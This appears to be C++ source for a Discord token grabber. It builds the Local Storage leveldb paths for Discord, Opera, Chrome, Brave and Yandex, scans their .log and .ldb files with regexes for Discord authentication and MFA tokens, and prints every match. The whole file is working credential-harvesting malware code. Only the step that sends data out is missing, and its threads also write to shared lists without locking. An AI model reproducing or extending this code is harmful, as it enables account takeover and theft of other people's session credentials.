#include <iostream>
#include <fstream>
#include <regex>
#include <string>
#include <memory>
#include <vector>
#include <filesystem>
#include <sys/stat.h>
#include <chrono>
#include <thread>

using namespace std;
namespace fs = std::filesystem;

bool hasEnding(string const& fullString, string const& ending) {
    if (fullString.length() >= ending.length()) {
        return (0 == fullString.compare(fullString.length() - ending.length(), ending.length(), ending));
    }
    else {
        return false;
    }
}

bool pathExist(const string& s) {
    struct stat buffer;
    return (stat(s.c_str(), &buffer) == 0);
}

vector<string> searchTokens(const string& file_path, const regex& tokenRegex) {
    vector<string> matchedTokens;

    ifstream bigFile(file_path, ios::binary);

    if (!bigFile.is_open()) {
        cerr << "Error: Unable to open the file." << endl;
        return matchedTokens;
    }

    constexpr size_t bufferSize = 1024 * 1024;
    unique_ptr<char[]> buffer(new char[bufferSize]);

    cout << "Looking for tokens in : " << "\033[35m" << file_path << "\033[0m" << endl;

    string accumulatedData = "";

    while (bigFile) {
        bigFile.read(buffer.get(), bufferSize);

        string data(buffer.get(), bigFile.gcount());

        accumulatedData += data;
    }

    smatch matches;

    while (regex_search(accumulatedData, matches, tokenRegex)) {
        matchedTokens.push_back(matches[0].str());
        accumulatedData = matches.suffix().str();
    }

    bigFile.close();
    return matchedTokens;
}

std::string* grabPath() {
    std::string* targetLocations = new std::string[7];

    char* roaming = nullptr;
    size_t len;
    if (_dupenv_s(&roaming, &len, "APPDATA") != 0) {
        std::cerr << "Error retrieving APPDATA environment variable." << std::endl;
        return nullptr;
    }

    char* local = nullptr;
    size_t len2;
    if (_dupenv_s(&local, &len2, "LOCALAPPDATA") != 0) {
        std::cerr << "Error retrieving LOCALAPPDATA environment variable." << std::endl;
        free(roaming);
        return nullptr;
    }

    targetLocations[0] = std::string(roaming) + "\\Discord";
    targetLocations[1] = std::string(roaming) + "\\discordcanary";
    targetLocations[2] = std::string(roaming) + "\\discordptb";
    targetLocations[3] = std::string(roaming) + "\\Opera Software\\Opera Stable";
    targetLocations[4] = std::string(local) + "\\Google\\Chrome\\User Data\\Default";
    targetLocations[5] = std::string(local) + "\\BraveSoftware\\Brave-Browser\\User Data\\Default";
    targetLocations[6] = std::string(local) + "\\Yandex\\YandexBrowser\\User Data\\Default";

    for (int i = 0; i < 7; i++) {
        targetLocations[i] = targetLocations[i] + "\\Local Storage\\leveldb";
    }

    free(local);
    free(roaming);

    return targetLocations;
}

void processDirectory(const string& path, const regex& tokenRegex, const regex& mfaRegex, vector<string>& tokens, vector<string>& mfas) { // ADDING THREADS
    struct stat sb;
    if (stat(path.c_str(), &sb) == 0) {
        for (const auto& entry : fs::directory_iterator(path)) {
            if (hasEnding(entry.path().string(), ".log") || hasEnding(entry.path().string(), ".ldb")) {
                vector<string> stored_tokens = searchTokens(entry.path().string(), tokenRegex);
                vector<string> stored_mfa = searchTokens(entry.path().string(), mfaRegex);

                tokens.insert(tokens.end(), stored_tokens.begin(), stored_tokens.end());
                mfas.insert(mfas.end(), stored_mfa.begin(), stored_mfa.end());
            }
        }
    }
}

int main() {
    chrono::high_resolution_clock::time_point begin = chrono::high_resolution_clock::now();

    vector<string> tokens;
    vector<string> mfas;
    struct stat sb;
    std::string* path = grabPath();

    // Define regex patterns for tokens and MFA
    regex tokenRegex("([\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{27})");
    regex mfaRegex("mfa\\.[\\w-]{84}");

    vector<thread> threads;

    for (int i = 0; i < 7; i++) {
        threads.emplace_back([&, i]() {
            processDirectory(path[i], tokenRegex, mfaRegex, tokens, mfas);
            });
    }

    for (auto& thread : threads) {
        thread.join();
    }

    cout << "Tokens found:" << endl;
    for (const string& token : tokens) {
        cout << "\033[32m" << token << "\033[0m" << endl;
    }

    cout << "MFA found:" << endl;
    for (const string& mfa : mfas) {
        cout << "\033[32m" << mfa << "\033[0m" << endl;
    }

    delete[] path;

    chrono::high_resolution_clock::time_point end = chrono::high_resolution_clock::now();
    chrono::nanoseconds elapsed = chrono::duration_cast<chrono::nanoseconds>(end - begin);
    printf("Time measured: \033[33m%.3f\033[0m seconds.\n", elapsed.count() * 1e-9);
    return 0;
}

